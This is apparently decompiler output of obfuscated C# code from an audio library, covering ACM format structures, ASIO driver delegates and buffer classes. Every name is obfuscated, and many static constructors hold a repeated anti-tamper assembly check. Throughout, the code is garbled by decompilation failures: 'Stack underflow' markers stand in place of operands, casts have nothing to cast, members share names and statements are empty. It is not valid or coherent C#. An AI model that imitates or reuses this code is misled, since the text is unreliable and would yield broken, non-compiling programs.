		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 512)]
		public string _0005;

		private const int _0004 = 32;

		private const int _0005 = 128;

		private const int _0006 = 80;

		private const int _0007 = 128;

		private const int _0008 = 512;
	}
}
namespace _0005
{
	[Flags]
	internal enum _000E
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4,
		_0004 = 8,
		_0005 = 0x10,
		_0006 = 0x40000000,
		_0007 = int.MinValue
	}
}
namespace _000F
{
	[Flags]
	internal enum _0008
	{
		_0001 = 0x40000000,
		_0002 = int.MinValue
	}
}
namespace _0006
{
	internal sealed class _000F
	{
		private readonly _001F._0008 _0001;

		private readonly global::_0005._0005 _0001;

		public int FormatIndex => ((_000F)/*Error near IL_0007: Stack underflow*/)._0001._0002;

		public WaveFormatEncoding FormatTag => (WaveFormatEncoding)((_000F)/*Error near IL_0007: Stack underflow*/)._0001._0003;

		public global::_0005._000E SupportFlags => ((_000F)/*Error near IL_0007: Stack underflow*/)._0001._0001;

		public global::_0005._0005 WaveFormat => ((_000F)/*Error near IL_0007: Stack underflow*/)._0001;

		public int WaveFormatByteSize => ((_000F)/*Error near IL_0007: Stack underflow*/)._0001._0004;

		public string FormatDescription => ((_000F)/*Error near IL_0007: Stack underflow*/)._0001._0001;

		internal _000F(_001F._0008 _0098_0090_0006)
		{
			this._0001 = _0098_0090_0006;
			_0001 = global::_0011._0018._0001(_0098_0090_0006._0001);
		}

		static _000F()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0011
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto, Pack = 4)]
	internal struct _000E
	{
		public int _0001;

		public global::_000E._0011 _0001;

		public IntPtr _0001;

		public IntPtr _0002;

		public int _0002;

		[MarshalAs(UnmanagedType.LPTStr)]
		public string _0001;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 48)]
		public string _0002;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
		public string _0003;

		[MarshalAs(UnmanagedType.LPTStr)]
		public string _0004;

		public int _0003;

		public _001E._000F _0001;

		public IntPtr _0003;

		public IntPtr _0004;

		[MarshalAs(UnmanagedType.LPTStr)]
		public string _0005;

		public IntPtr _0005;

		public global::_0008._0008._0004 _0001;
	}
}
namespace _000E
{
	[Flags]
	internal enum _0011
	{
		_0001 = 0,
		_0002 = 4,
		_0003 = 8,
		_0004 = 0x10,
		_0005 = 0x20,
		_0006 = 0x40,
		_0007 = 0x80
	}
}
namespace _001F
{
	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct _0008
	{
		public int _0001;

		public int _0002;

		public int _0003;

		public global::_0005._000E _0001;

		public IntPtr _0001;

		public int _0004;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
		public string _0001;

		public const int _0005 = 128;
	}
}
namespace _001E
{
	[Flags]
	internal enum _000F
	{
		_0001 = 0,
		_0002 = 0x100000,
		_0003 = 0x400000,
		_0004 = 0x800000,
		_0005 = 0x20000,
		_0006 = 0x40000,
		_0007 = 0x1000000,
		_0008 = 0x200000,
		_000E = 0x80000,
		_000F = 0x10000
	}
}
namespace _0005
{
	[Flags]
	internal enum _000F
	{
		_0001 = 0x10000,
		_0002 = 0x20000,
		_0003 = 0x40000,
		_0004 = 0x80000,
		_0005 = 0xFF0000
	}
}
namespace _0019
{
	internal sealed class _000E
	{
		internal global::_001F._000E _0001;

		public int FormatTagIndex => ((_000E)/*Error near IL_0007: Stack underflow*/)._0001._0002;

		public WaveFormatEncoding FormatTag => (WaveFormatEncoding)((_000E)/*Error near IL_0007: Stack underflow*/)._0001._0003;

		public int FormatSize => ((_000E)/*Error near IL_0007: Stack underflow*/)._0001._0004;

		public global::_0005._000E SupportFlags => ((_000E)/*Error near IL_0007: Stack underflow*/)._0001._0001;

		public int StandardFormatsCount => ((_000E)/*Error near IL_0007: Stack underflow*/)._0001._0005;

		public string FormatDescription => ((_000E)/*Error near IL_0007: Stack underflow*/)._0001._0001;

		internal _000E(global::_001F._000E _0099_0090_0006)
		{
			_0001 = _0099_0090_0006;
		}
	}
}
namespace _001F
{
	internal struct _000E
	{
		public int _0001;

		public int _0002;

		public int _0003;

		public int _0004;

		public global::_0005._000E _0001;

		public int _0005;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 48)]
		public string _0001;

		public const int _0006 = 48;
	}
}
namespace _0008
{
	internal sealed class _0008
	{
		public delegate bool _0001(IntPtr hAcmDriverId, IntPtr instance, global::_0005._000E flags);

		public delegate bool _0002(IntPtr hAcmDriverId, ref _001F._0008 formatDetails, IntPtr dwInstance, global::_0005._000E flags);

		public delegate bool _0003(IntPtr hAcmDriverId, ref _001F._000E formatTagDetails, IntPtr dwInstance, global::_0005._000E flags);

		public delegate bool _0004(IntPtr windowHandle, int message, IntPtr wParam, IntPtr lParam);

		static _0008()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0006
{
	internal sealed class _0010 : IDisposable
	{
		internal IntPtr _0001;

		private IntPtr m__0002;

		internal _001D._0010 _0001;

		internal global::_0005._0005 _0001;

		public byte[] SourceBuffer => ((_0010)/*Error near IL_0007: Stack underflow*/)._0001._0001;

		public byte[] DestBuffer => ((_0010)/*Error near IL_0007: Stack underflow*/)._0001._0002;

		public _0010(global::_0005._0005 _0089_008F_0006, global::_0005._0005 _009A_0090_0006)
		{
			try
			{
				this._0001 = IntPtr.Zero;
				this._0001 = _0089_008F_0006;
				int num = Math.Max(65536, _0089_008F_0006._0002);
				num -= num % _0089_008F_0006.BlockAlign;
				global::_0011._0018._0001(global::_0011._0018._0001(out this._0001, IntPtr.Zero, _0089_008F_0006, _009A_0090_0006, (global::_0017._0012)null, IntPtr.Zero, IntPtr.Zero, global::_0007._000F._0003), _0080._0014._0001(107384577));
				int num2 = global::_0011._0018._0001(num, this);
				this._0001 = new _001D._0010(this._0001, num, num2);
				this.m__0002 = IntPtr.Zero;
			}
			catch
			{
				_0001();
				throw;
			}
		}

		public _0010(IntPtr _009B_0090_0006, global::_0005._0005 _0089_008F_0006, global::_0017._0012 _009C_0090_0006)
		{
			int num = Math.Max(16384, _0089_008F_0006._0002);
			this._0001 = _0089_008F_0006;
			num -= num % _0089_008F_0006.BlockAlign;
			global::_0011._0018._0001(global::_0011._0018._0001(out this.m__0002, _009B_0090_0006, 0), _0080._0014._0001(107384044));
			global::_0011._0018._0001(global::_0011._0018._0001(out this._0001, this.m__0002, _0089_008F_0006, _0089_008F_0006, _009C_0090_0006, IntPtr.Zero, IntPtr.Zero, global::_0007._000F._0003), _0080._0014._0001(107384577));
			this._0001 = new _001D._0010(this._0001, num, global::_0011._0018._0001(num, this));
		}

		[Obsolete("Call the version returning sourceBytesConverted instead")]
		public unsafe int _0001(int _0002)
		{
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			int num = default(int);
			_ = ref num;
			global::_0011._0018._0001(ref *(int*)/*Error near IL_0029: Stack underflow*/, (_0010)/*Error near IL_0029: Stack underflow*/, (int)/*Error near IL_0029: Stack underflow*/);
			if (num != _0002)
			{
				throw new global::_0013._0001(MmResult.NotSupported, _0080._0014._0001(107384055));
			}
			return (int)/*Error near IL_001e: Stack underflow*/;
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			((_0010)/*Error near IL_001a: Stack underflow*/)._0001(_0002: true);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_009d: Incompatible stack heights: 0 vs 1
			//IL_00a3: Incompatible stack heights: 0 vs 1
			//IL_00a9: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ != 0 && ((_0010)/*Error near IL_0011: Stack underflow*/)._0001 != null)
			{
				((_0010)/*Error near IL_001d: Stack underflow*/)._0001._0001();
				this._0001 = null;
			}
			if (_0090_0002._0099_0005(this._0001, IntPtr.Zero))
			{
				MmResult mmResult = global::_0011._0018._0001(this._0001, 0);
				this._0001 = IntPtr.Zero;
				if (mmResult != 0)
				{
					throw new global::_0013._0001(mmResult, _0080._0014._0001(107383986));
				}
			}
			if (_0090_0002._0099_0005(this.m__0002, IntPtr.Zero))
			{
				global::_0011._0018._0001(this.m__0002, 0);
				this.m__0002 = IntPtr.Zero;
			}
		}

		protected override void _0002()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0010)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}
	}
}
namespace _001D
{
	internal sealed class _0010 : IDisposable
	{
		internal global::_0013._000E _0001;

		internal byte[] _0001;

		internal GCHandle _0001;

		internal byte[] _0002;

		internal GCHandle _0002;

		internal IntPtr _0001;

		internal bool _0001;

		private bool m__0002;

		public byte[] SourceBuffer => ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;

		public byte[] DestBuffer => ((_0010)/*Error near IL_0007: Stack underflow*/)._0002;

		public _0010(IntPtr _009D_0090_0006, int _009E_0090_0006, int _009F_0090_0006)
		{
			this._0001 = new global::_0013._000E();
			this._0001 = new byte[_009E_0090_0006];
			this._0001 = GCHandle.Alloc(this._0001, GCHandleType.Pinned);
			this._0002 = new byte[_009F_0090_0006];
			this._0002 = GCHandle.Alloc(this._0002, GCHandleType.Pinned);
			this._0001 = _009D_0090_0006;
			this._0001 = true;
		}

		public void _0001()
		{
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = _0091_0002._009B_0005;
			/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/);
			((_0010)/*Error near IL_0011: Stack underflow*/)._0001(_0002: true);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected virtual void _0001(bool _0002)
		{
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			if (!((_0010)/*Error near IL_0007: Stack underflow*/).m__0002)
			{
				((_0010)/*Error near IL_0011: Stack underflow*/)._0001 = null;
				((_0010)/*Error near IL_0019: Stack underflow*/)._0002 = null;
				this._0001.Free();
				this._0002.Free();
			}
			this.m__0002 = true;
		}

		protected override void _0002()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0010)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		static _0010()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0016
{
	[Flags]
	internal enum _0011
	{
		_0001 = 0x10000,
		_0002 = 0x20000,
		_0003 = 0x100000
	}
}
namespace _0013
{
	[StructLayout(LayoutKind.Sequential, Size = 128)]
	internal sealed class _000E
	{
		public int _0001;

		public global::_0016._0011 _0001;

		public IntPtr _0001;

		public IntPtr _0002;

		public int _0002;

		public int _0003;

		public IntPtr _0003;

		public IntPtr _0004;

		public int _0004;

		public int _0005;

		public IntPtr _0005;
	}
}
namespace _0007
{
	[Flags]
	internal enum _000F
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4,
		_0004 = 0x70000,
		_0005 = 0,
		_0006 = 0x10000,
		_0007 = 0x20000,
		_0008 = 0x30000,
		_000E = 0x20000,
		_000F = 0x50000
	}
}
namespace _0080
{
	internal enum _0008
	{
		_0001,
		_0002
	}
}
namespace _0017
{
	[StructLayout(LayoutKind.Sequential)]
	internal sealed class _0012
	{
		public int _0001 = Marshal.SizeOf(typeof(_0012));

		public int _0002;

		public int _0003;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 5)]
		public int[] _0001;

		static _0012()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _001A
{
	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct _0007
	{
		public uint _0001;

		public uint _0002;
	}
}
namespace _0010
{
	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct _000E
	{
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate void _0001(int doubleBufferIndex, bool directProcess);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate void _0002(double sRate);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int _0003(global::_001D._0011 selector, int value, IntPtr message, IntPtr opt);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate IntPtr _0004(IntPtr asioTimeParam, int doubleBufferIndex, bool directProcess);

		public _0001 _0001;

		public _0002 _0001;

		public _0003 _0001;

		public _0004 _0001;
	}
}
namespace _0017
{
	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct _0013
	{
		public int _0001;

		public bool _0001;

		public bool _0002;

		public int _0002;

		[MarshalAs(UnmanagedType.U4)]
		public AsioSampleType _0001;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		public string _0001;
	}
	internal sealed class _0014
	{
		public string _0001;

		public int _0001;

		public int _0002;

		public int _0003;

		public int _0004;

		public int _0005;

		public int _0006;

		public int _0007;

		public int _0008;

		public double _0001;

		public _0013[] _0001;

		public _0013[] _0002;
	}
}
namespace _001D
{
	internal enum _0011
	{
		_0001 = 1,
		_0002,
		_0003,
		_0004,
		_0005,
		_0006,
		_0007,
		_0008,
		_000E,
		_000F,
		_0010,
		_0011,
		_0012,
		_0013,
		_0014
	}
}
namespace _0017
{
	internal sealed class _0015
	{
		[StructLayout(LayoutKind.Sequential, Pack = 2)]
		internal sealed class _0001
		{
			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate int _0001(IntPtr _pUnknown, IntPtr sysHandle);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate void _0002(IntPtr _pUnknown, StringBuilder name);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate int _0003(IntPtr _pUnknown);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate void _0004(IntPtr _pUnknown, StringBuilder errorMessage);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0005(IntPtr _pUnknown);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0006(IntPtr _pUnknown);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0007(IntPtr _pUnknown, out int numInputChannels, out int numOutputChannels);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0008(IntPtr _pUnknown, out int inputLatency, out int outputLatency);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _000E(IntPtr _pUnknown, out int minSize, out int maxSize, out int preferredSize, out int granularity);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _000F(IntPtr _pUnknown, double sampleRate);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0010(IntPtr _pUnknown, out double sampleRate);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0011(IntPtr _pUnknown, double sampleRate);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0012(IntPtr _pUnknown, out long clocks, int numSources);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0013(IntPtr _pUnknown, int reference);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0014(IntPtr _pUnknown, out long samplePos, ref global::_001A._0007 timeStamp);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0015(IntPtr _pUnknown, ref global::_0017._0013 info);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0016(IntPtr _pUnknown, IntPtr bufferInfos, int numChannels, int bufferSize, IntPtr callbacks);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0017(IntPtr _pUnknown);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0018(IntPtr _pUnknown);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _0019(IntPtr _pUnknown, int selector, IntPtr opt);

			[UnmanagedFunctionPointer(CallingConvention.ThisCall)]
			public delegate AsioError _001A(IntPtr _pUnknown);

			public _0001 _0001;

			public _0002 _0001;

			public _0003 _0001;

			public _0004 _0001;

			public _0005 _0001;

			public _0006 _0001;

			public _0007 _0001;

			public _0008 _0001;

			public _000E _0001;

			public _000F _0001;

			public _0010 _0001;

			public _0011 _0001;

			public _0012 _0001;

			public _0013 _0001;

			public _0014 _0001;

			public _0015 _0001;

			public _0016 _0001;

			public _0017 _0001;

			public _0018 _0001;

			public _0019 _0001;

			public _001A _0001;

			static _0001()
			{
				//IL_00bb: Incompatible stack heights: 0 vs 1
				bool flag = false;
				global::_0001._0001();
				Assembly assembly;
				if (true)
				{
					assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
				}
				Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
				if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
				{
					return;
				}
				throw new SecurityException(global::_0080._0014._0001(107396706));
			}
		}

		internal IntPtr _0001;

		internal IntPtr _0002;

		internal _0001 _0001;

		internal _0015()
		{
		}

		internal unsafe void _0001(Guid _0002)
		{
			//IL_00c2: Incompatible stack heights: 0 vs 5
			//IL_00cc: Incompatible stack heights: 0 vs 1
			_ = ref _0002;
			_ = IntPtr.Zero;
			_ = 1;
			_ = ref _0002;
			global::_0011._0018._0001(_0006: out ((_0015)/*Error near IL_0014: Stack underflow*/)._0001, _0002: ref *(Guid*)/*Error near IL_00cc: Stack underflow*/, _0003: (IntPtr)/*Error near IL_00cc: Stack underflow*/, _0004: (uint)/*Error near IL_00cc: Stack underflow*/, _0005: ref *(Guid*)/*Error near IL_00cc: Stack underflow*/);
			int num = (int)/*Error near IL_00d2: Stack underflow*/;
			if (num != 0)
			{
				throw new COMException(global::_0080._0014._0001(107383965), num);
			}
			IntPtr intPtr = _0019_0003._0095_0006(this._0001);
			this._0001 = new _0001();
			FieldInfo[] array = _001A_0003._0096_0006(_0091._0080_0004(typeof(_0001).TypeHandle));
			for (int i = 0; i < array.Length; i++)
			{
				FieldInfo fieldInfo = array[i];
				object obj = _001E_0003._009E_0006(_001C_0003._009A_0006(intPtr, (i + 3) * _001B_0003._0097_0006()), _001D_0003._007E_009B_0006(fieldInfo));
				_001F_0003._007E_009F_0006(fieldInfo, this._0001, obj);
			}
		}

		static _0015()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0080
{
	internal delegate void _000E(IntPtr[] inputChannels, IntPtr[] outputChannels);
}
namespace _0016
{
	internal sealed class _0012
	{
		internal readonly global::_0017._0015 _0001;

		internal global::_0010._000E _0001;

		internal global::_0017._0014 _0001;

		internal global::_0014._000F[] _0001;

		internal bool _0001;

		internal IntPtr[] _0001;

		internal IntPtr[] _0002;

		internal int _0001;

		internal int _0002;

		internal _0080._000E _0001;

		internal int _0003;

		internal int _0004;

		internal int _0005;

		public global::_0017._0015 Driver => ((_0012)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0080._000E FillBufferCallback
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0012)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0012)/*Error near IL_0009: Stack underflow*/)._0001 = (_0080._000E)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0017._0014 Capabilities => ((_0012)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0012(global::_0017._0015 _0001_0091_0006)
		{
			this._0001 = _0001_0091_0006;
			if (!global::_0011._0018._0001(_0001_0091_0006, IntPtr.Zero))
			{
				throw new InvalidOperationException(global::_0011._0018._0001(_0001_0091_0006));
			}
			this._0001 = default(global::_0010._000E);
			this._0001._0001 = _0001;
			this._0001._0001 = _0001;
			this._0001._0001 = _0001;
			this._0001._0001 = _0001;
			global::_0011._0018._0001(this);
		}

		private void _0001(int _0002, bool _0003)
		{
			//IL_00b5: Incompatible stack heights: 0 vs 1
			//IL_00bb: Incompatible stack heights: 0 vs 2
			for (int i = 0; i < this._0002; i++)
			{
				_ = ((_0012)/*Error near IL_0012: Stack underflow*/)._0002;
				IntPtr intPtr = this._0001[i + _0005]._0001(_0002);
				((IntPtr[])/*Error near IL_0031: Stack underflow*/)[/*Error near IL_0031: Stack underflow*/] = intPtr;
			}
			for (int j = 0; j < this._0001; j++)
			{
				this._0001[j] = this._0001[j + _0004 + this._0001._0001]._0001(_0002);
			}
			this._0001?.Invoke(this._0002, this._0001);
			if (this._0001)
			{
				global::_0011._0018._0001(this._0001);
			}
		}

		private void _0001(double _0002)
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 2
			_ = ((_0012)/*Error near IL_0007: Stack underflow*/)._0001;
			((global::_0017._0014)/*Error near IL_000e: Stack underflow*/)._0001 = (double)/*Error near IL_000e: Stack underflow*/;
		}

		private int _0001(global::_001D._0011 _0002, int _0003, IntPtr _0004, IntPtr _0005)
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			//IL_002c: Expected I4, but got Unknown
			//IL_0091: Incompatible stack heights: 0 vs 1
			//IL_009b: Incompatible stack heights: 0 vs 2
			//IL_009e: Incompatible stack heights: 0 vs 1
			switch (/*Error near IL_0007: Stack underflow*/ - 1)
			{
			case 0:
				_ = _007F_0003._0003_0007;
				_0091._0080_0004(typeof(global::_001D._0011).TypeHandle);
				switch ((global::_001D._0011)/*Error near IL_0046: Stack underflow*/((Type)/*Error near IL_0046: Stack underflow*/, (int)/*Error near IL_0046: Stack underflow*/))
				{
				case global::_001D._0011._0002:
					return 1;
				case global::_001D._0011._0003:
					return 0;
				case global::_001D._0011._0004:
					return 0;
				case global::_001D._0011._0005:
					return 0;
				case global::_001D._0011._0006:
					return 0;
				case global::_001D._0011._0007:
					return 0;
				case global::_001D._0011._0008:
					return 0;
				}
				break;
			case 1:
				return 2;
			case 2:
				return 1;
			case 3:
				return 0;
			case 4:
				return 0;
			case 5:
				return 0;
			case 6:
				return 0;
			case 7:
				return 0;
			}
			return 0;
		}

		private IntPtr _0001(IntPtr _0002, int _0003, bool _0004)
		{
			return IntPtr.Zero;
		}
	}
}
namespace _0014
{
	internal sealed class _000E
	{
		public delegate void _0001(IntPtr inputInterleavedBuffer, IntPtr[] asioOutputBuffers, int nbChannels, int nbSamples);

		static _000E()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0016
{
	internal sealed class _0013 : Exception
	{
		private AsioError _0001;

		public AsioError Error
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0013)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0036: Incompatible stack heights: 0 vs 1
				//IL_0039: Incompatible stack heights: 0 vs 1
				//IL_003c: Incompatible stack heights: 0 vs 3
				((_0013)/*Error near IL_0009: Stack underflow*/)._0001 = (AsioError)/*Error near IL_0009: Stack underflow*/;
				_ = _001F_0003._007E_0001_0007;
				_ = _0080_0003._007E_0004_0007;
				IDictionary dictionary = /*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/);
				string text = _0080._0014._0001(107383892);
				object obj = _0001;
				/*Error near IL_0034: Stack underflow*/(dictionary, text, obj);
			}
		}

		public _0013()
		{
		}

		public _0013(string _001F_001E_0006)
			: base(_001F_001E_0006)
		{
		}

		public _0013(string _001F_001E_0006, Exception _0002_0091_0006)
			: base(_001F_001E_0006, _0002_0091_0006)
		{
		}
	}
}
namespace _0014
{
	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct _000F
	{
		public bool _0001;

		public int _0001;

		public IntPtr _0001;

		public IntPtr _0002;

		public IntPtr _0001(int _0002)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				return ((_000F)/*Error near IL_000b: Stack underflow*/)._0002;
			}
			return ((_000F)/*Error near IL_0013: Stack underflow*/)._0001;
		}
	}
}
namespace _0002
{
	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct _0011
	{
		public double _0001;

		public global::_001A._0007 _0001;

		public _001F._000F _0001;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 64)]
		public string _0001;
	}
}
namespace _001F
{
	[Flags]
	internal enum _000F
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4,
		_0004 = 8,
		_0005 = 0x10,
		_0006 = 0x100
	}
}
namespace _0003
{
	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct _0008
	{
		public double _0001;

		public _001A._0007 _0001;

		public _001A._0007 _0002;

		public double _0002;

		public global::_0014._0010 _0001;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 12)]
		public string _0001;
	}
}
namespace _0014
{
	[Flags]
	internal enum _0010
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4,
		_0004 = 8,
		_0005 = 0x10,
		_0006 = 0x20
	}
}
